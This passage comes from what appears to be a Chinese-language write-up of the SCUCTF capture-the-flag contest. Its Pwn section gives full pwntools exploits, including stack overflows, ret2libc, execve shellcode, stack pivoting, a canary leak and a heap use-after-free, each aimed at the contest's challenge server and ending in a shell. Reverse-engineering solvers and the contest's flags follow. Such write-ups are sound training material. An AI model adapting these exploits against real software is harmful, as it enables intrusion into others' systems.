main()</span><br></pre></td></tr></table></figure>



<p>scuctf{Welcomet0th3cl4ss1cCipher}</p>
<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><p>连上就是shell cat flag</p>
<h3 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">##io = process(&#x27;./ret2text&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10007</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x4007A5</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{69c751a9-fec9-440f-bbd8-f4983a7f6859}</p>
<h3 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h3><p>LibcSearcher找不到，泄漏了一下puts发现和自己的ubuntu16一样，直接拿自己libc打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./ret2libc&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10005</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2libc&#x27;</span>)</span><br><span class="line">edi = <span class="number">0x4009f3</span></span><br><span class="line">start = <span class="number">0x400790</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">payload += p64(edi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(start)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ret2libc!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">puts = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&#x27;puts : &#x27;</span>+hex(puts))</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">offset = puts - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;offset : &#x27;</span>+hex(offset))</span><br><span class="line">system = offset + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = offset + libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).next()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">0x78</span></span><br><span class="line">payload += p64(edi) + p64(binsh)</span><br><span class="line">payload += p64(system) + p64(start)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;ret2libc!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{a84ce74a-1810-4ab9-b0db-210d48b7a3ac}</p>
<h3 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h3><p>最后mian函数返回的反汇编有点不太平常</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">.text:08048980                 mov     ecx, [ebp+var_4]</span><br><span class="line">.text:08048983                 leave</span><br><span class="line">.text:08048984                 lea     esp, [ecx-4]</span><br><span class="line">.text:08048987                 retn</span><br></pre></td></tr></table></figure>

<p>esp由ebp-4位置的值控制 注意一下就可以了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./ret2shellcode&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10006</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x0804894A&#x27;)</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = p32(<span class="number">0x080F0A04</span>) + \</span><br><span class="line">    <span class="string">&#x27;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80&#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;\x00&#x27;</span>*(<span class="number">0x64</span>-len(payload))</span><br><span class="line">payload += p32(<span class="number">0x080F0A04</span>)+p32(<span class="number">0x080F0A04</span>)</span><br><span class="line">payload += <span class="string">&#x27;AAAA&#x27;</span> + p32(<span class="number">0x080F0A00</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{3ef12c4b-79f0-44f5-b119-e7b6f48c9aaa}</p>
<h3 id="stack-migration"><a href="#stack-migration" class="headerlink" title="stack_migration"></a>stack_migration</h3><p>栈迁移 刚好够的那种</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./stack_migration&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10008</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./stack_migration&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io, &#x27;b* 0x4008C0&#x27;)</span></span><br><span class="line">ret = <span class="number">0x400659</span></span><br><span class="line">edi = <span class="number">0x400993</span></span><br><span class="line">leave = <span class="number">0x4008cb</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;addr:&#x27;</span>)</span><br><span class="line">stack = int(io.recvline()[:<span class="number">-1</span>], <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(edi) + p64(stack+<span class="number">0x18</span>) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">payload += p64(stack<span class="number">-8</span>) + p64(leave)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&#x27;SCUCTF:\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{9afea5c3-a5ff-4204-a9ba-82eb1c128f8f}</p>
<h3 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h3><p>覆盖掉’\x00’可以puts泄漏canary</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./canary&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">binsh = <span class="number">0x400885</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;length?\n&#x27;</span>, <span class="string">&#x27;32&#x27;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x18</span>+<span class="string">&#x27;#&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;what?\n&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">canary = <span class="string">&#x27;\x00&#x27;</span>+io.recv(<span class="number">7</span>)</span><br><span class="line">success(<span class="string">&#x27;canary : &#x27;</span>+hex(u64(canary))[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">0x18</span>+canary+p64(binsh)*<span class="number">2</span></span><br><span class="line">io.sendafter(<span class="string">&#x27;OK!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{a482f708-a883-40b9-81f5-1f205eb565f3}</p>
<h3 id="easy-uaf"><a href="#easy-uaf" class="headerlink" title="easy_uaf"></a>easy_uaf</h3><p>unsortbin泄露libc   fastbin改fk</p>
<p>把堆分配到bss上存堆指针的地方  把堆的指针改成freegot</p>
<p>edit覆盖成sysplt  然后free就变成了sys</p>
<p>让某个堆里写个sh free</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, str(size))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;buf: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">id, content</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>, str(id))</span><br><span class="line">    io.sendafter(<span class="string">&#x27;buf: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">id</span>):</span></span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;idx: &#x27;</span>, str(id))</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./easy_uaf&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;121.196.34.30&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./easy_uaf&#x27;</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&#x27;b&#x27;</span>)  <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>)  <span class="comment"># 2</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">malloc_hook = u64(io.recv(<span class="number">6</span>)+<span class="string">&#x27;\x00\x00&#x27;</span>)<span class="number">-0x151</span></span><br><span class="line">success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc = LibcSearcher(&#x27;__malloc_hook&#x27;, malloc_hook)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libcbase = malloc_hook-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">success(hex(libcbase))</span><br><span class="line">sys_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libcbase</span><br><span class="line">success(hex(sys_addr))</span><br><span class="line"></span><br><span class="line">fake_chunk = <span class="number">0x60209d</span></span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>, p64(fake_chunk))  <span class="comment"># 3</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">3</span>, p64(fake_chunk))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment"># 4</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">add(<span class="number">0x60</span>, <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x13</span>)+p64(free_got)+p64(<span class="number">8</span>))</span><br><span class="line">edit(<span class="number">0</span>, p64(sys_addr))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>flag{be6f3d34-5cc0-4023-8f94-7238e8e4e35c}</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h3 id="easyF5"><a href="#easyF5" class="headerlink" title="easyF5"></a>easyF5</h3><p>F5</p>
<h3 id="pytrade"><a href="#pytrade" class="headerlink" title="pytrade"></a>pytrade</h3><p>在线pyc反编译得到base64加密串，解密得到flag</p>
<h3 id="easypack"><a href="#easypack" class="headerlink" title="easypack"></a>easypack</h3><p>UPX解压缩，每个字符异或0x12得到flag</p>
<h3 id="maze"><a href="#maze" class="headerlink" title="maze"></a>maze</h3><p>替换一下空格</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.*...*****</span><br><span class="line">...*.*****</span><br><span class="line">****..****</span><br><span class="line">*****....*</span><br><span class="line">********..</span><br></pre></td></tr></table></figure>

<p>scuctf{DRRURRDDRDRRRDR}</p>
<h3 id="crackme"><a href="#crackme" class="headerlink" title="crackme"></a>crackme</h3><p>IDA在输入前下断，单步到判断，修改zf，continue得到flag</p>
<p>scuctf{e2b2fffd4ef9306d02beafbcd668aabb}</p>
<h3 id="decryptme"><a href="#decryptme" class="headerlink" title="decryptme"></a>decryptme</h3><p>dump函数，爆破</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> goal[]=<span class="string">&quot;34e8h9?&lt;&lt;mkCD&gt;F@DEDCzHxxKRQRNSRS&quot;</span>;</span><br><span class="line">	<span class="keyword">int</span> v2,v3,v4,v5,v6,v7,v8;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> c=<span class="number">0x2f</span>; c&lt;<span class="number">0x7f</span>; c++)</span><br><span class="line">		&#123;</span><br><span class="line">			v2 = i ^ c;</span><br><span class="line">			v3 = i &amp; c;</span><br><span class="line">			v7 = c;</span><br><span class="line">			v6 = i;</span><br><span class="line">			<span class="keyword">do</span></span><br><span class="line">			&#123;</span><br><span class="line">				v4 = <span class="number">2</span> * (v6 &amp; v7);</span><br><span class="line">				v7 ^= v6;</span><br><span class="line">				v6 = v4;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">while</span> ( v4 );</span><br><span class="line">			<span class="keyword">if</span>(v7 == goal[i])</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c);</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>scuctf{33c5d4954da881814420f3ba39772644}</p>
<h3 id="helptingting"><a href="#helptingting" class="headerlink" title="helptingting"></a>helptingting</h3><p>处理太麻烦</p>
<p><a target="_blank" rel="noopener" href="https://paste.ubuntu.com/p/Y2FW4gZkNM/">EXP</a></p>
<p>scuctf{b5ee21708409a1a05f5401199997bd65}</p>
<h3 id="pytrade-plus"><a href="#pytrade-plus" class="headerlink" title="pytrade-plus"></a>pytrade-plus</h3><p>用网址内工具反编译，挨着挨着看pyc 找到controller.pyc为主要函数，一个方程z3解</p>
<p>scuctf{39333031323433373134303932333037}</p>
<h3 id="虚假的比较函数"><a href="#虚假的比较函数" class="headerlink" title="虚假的比较函数"></a>虚假的比较函数</h3><p>存在TLS </p>
<p>发现奇怪的运算函数sub_140015D70</p>
<p>hook之后发现第一个参数是输入，第二个参数是scuctf{fakeflag}</p>
<p>复杂计算之后与input异或，但是没有吧数据dump出来</p>
<p>复制代码，添加IDA宏定义自己跑</p>
<p>异或得到flag</p>
<p><a target="_blank" rel="noopener" href="https://paste.ubuntu.com/p/n5RKxvBFZ3/">代码</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">f = open(<span class="string">&#x27;so.in&#x27;</span>)</span><br><span class="line">b = [<span class="number">0xeb</span>, <span class="number">0x72</span>, <span class="number">0xd4</span>, <span class="number">0x76</span>, <span class="number">0x6f</span>, <span class="number">0x9c</span>, <span class="number">0xe2</span>, <span class="number">0x99</span>, <span class="number">0x99</span>, <span class="number">0x89</span>, <span class="number">0x1</span>, <span class="number">0xfe</span>, <span class="number">0x81</span>, <span class="number">0xfb</span>, <span class="number">0x62</span>, <span class="number">0x31</span>, <span class="number">0x6b</span>, <span class="number">0xb0</span>, <span class="number">0xf7</span>, <span class="number">0xec</span>, <span class="number">0xe9</span>, <span class="number">0x9e</span>,</span><br><span class="line">     <span class="number">0x36</span>, <span class="number">0xc6</span>, <span class="number">0x2e</span>, <span class="number">0x9f</span>, <span class="number">0x7</span>, <span class="number">0xa0</span>, <span class="number">0x20</span>, <span class="number">0xe9</span>, <span class="number">0xcc</span>, <span class="number">0x32</span>, <span class="number">0x7c</span>, <span class="number">0x5e</span>, <span class="number">0x22</span>, <span class="number">0x5f</span>, <span class="number">0xb7</span>, <span class="number">0xa9</span>, <span class="number">0x61</span>, <span class="number">0xa5</span>, <span class="number">0xa8</span>, <span class="number">0x1c</span>, <span class="number">0x70</span>, <span class="number">0x37</span>]</span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    s = f.readline()</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">16</span>):</span><br><span class="line">        a.append(int(s[j*<span class="number">3</span>:j*<span class="number">3</span>+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line">text = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">44</span>):</span><br><span class="line">    text += chr(a[i] ^ b[i])</span><br><span class="line"><span class="keyword">print</span> text</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="easyapk"><a href="#easyapk" class="headerlink" title="easyapk"></a>easyapk</h3><p>直接看so文件，tea加密</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">decrypt</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> *v, <span class="keyword">unsigned</span> <span class="keyword">long</span> *k)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> y=v[<span class="number">0</span>], z=v[<span class="number">1</span>], sum=<span class="number">0xC6EF3720</span>, i; <span class="comment">/* set up */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> delta=<span class="number">0x9e3779b9</span>;                  <span class="comment">/* a key schedule constant */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> a=k[<span class="number">0</span>], b=k[<span class="number">1</span>], c=k[<span class="number">2</span>], d=k[<span class="number">3</span>];    <span class="comment">/* cache key */</span></span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">32</span>; i++)                              <span class="comment">/* basic cycle start */</span></span><br><span class="line">	&#123;</span><br><span class="line">		z -= ((y&lt;&lt;<span class="number">4</span>) + c) ^ (y + sum) ^ ((y&gt;&gt;<span class="number">5</span>) + d);</span><br><span class="line">		y -= ((z&lt;&lt;<span class="number">4</span>) + a) ^ (z + sum) ^ ((z&gt;&gt;<span class="number">5</span>) + b);</span><br><span class="line">		sum -= delta;                                <span class="comment">/* end cycle */</span></span><br><span class="line">	&#125;</span><br><span class="line">	v[<span class="number">0</span>]=y;</span><br><span class="line">	v[<span class="number">1</span>]=z;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> key[]= &#123;<span class="number">0xEF</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0xDE</span>, <span class="number">0x14</span>, <span class="number">0x45</span>, <span class="number">0x11</span>, <span class="number">0xAA</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x75</span>, <span class="number">0x79</span>, <span class="number">0x73</span>, <span class="number">0x64</span>, <span class="number">0x79</span>, <span class="number">0x79</span>&#125;;</span><br><span class="line">	<span class="keyword">char</span> flag[]= &#123;<span class="number">0xDB</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x88</span>,<span class="number">0x08</span>, <span class="number">0xCA</span>, <span class="number">0x55</span>, <span class="number">0x15</span>, <span class="number">0x74</span>, <span class="number">0x19</span>, <span class="number">0xDA</span>, <span class="number">0xB9</span>, <span class="number">0x37</span>, <span class="number">0x46</span>, <span class="number">0x12</span>, <span class="number">0xF8</span>,</span><br><span class="line">	              <span class="number">0x26</span>, <span class="number">0xCA</span>, <span class="number">0xF9</span>, <span class="number">0x86</span>, <span class="number">0x40</span>, <span class="number">0x29</span>, <span class="number">0x47</span>, <span class="number">0xB5</span>, <span class="number">0xA0</span>, <span class="number">0xD6</span>, <span class="number">0xAA</span>, <span class="number">0x19</span>, <span class="number">0x42</span>, <span class="number">0x3F</span>, <span class="number">0xF1</span>, <span class="number">0x46</span></span><br><span class="line">	             &#125;;</span><br><span class="line">	decrypt((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)flag,(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)key);</span><br><span class="line">	decrypt((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(flag+<span class="number">8</span>),(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)key);</span><br><span class="line">	decrypt((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(flag+<span class="number">16</span>),(<span class="keyword">unsigned</span> <span class="keyword">long</span>*)key);</span><br><span class="line">	decrypt((<span class="keyword">unsigned</span> <span class="keyword">long</span>*)(flag+<span class="number">24</span>),(<span class="keyword">unsigned</span> 